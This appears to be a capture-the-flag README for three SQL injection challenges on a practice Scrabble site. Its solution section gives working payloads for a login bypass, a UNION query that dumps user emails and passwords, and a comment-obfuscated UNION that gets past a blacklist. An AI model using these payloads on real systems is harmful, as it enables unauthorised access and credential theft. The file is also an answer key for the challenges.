# Scrabble Quick Locator Interactive

## Challenges
1. `Scrabble Quick Locator Interactive 1`
   - Description: `Bypass the login and get the flag!`
   - Hint: `I love SQLI! Such a nice website!`
2. `Scrabble Quick Locator Interactive 2`
   - Description: `Find the original users's password!`
   - Hint: `Perhaps a UNION of techniques is needed...`
3. `Scrabble Quick Locator Interactive 2`
   - Description: `Find the result of the match in matches.php`
   - Hint: `A blacklist? Nothing can stop a true hacker! May the OWASP be with you!`

## Challenges Specifics
1. Simple SQLi in Login
2. SQLi + union in WordSearch to leak Flag table
3. SQLi + blacklist to leak result field

## Solution
1. login.php => `' or 1=1 #`
2. index.php => `' union select email, pass from users #`
3. matches.php => `'/**/union/**/select/**/result,p1,p2/**/from/**/matches/**/#`
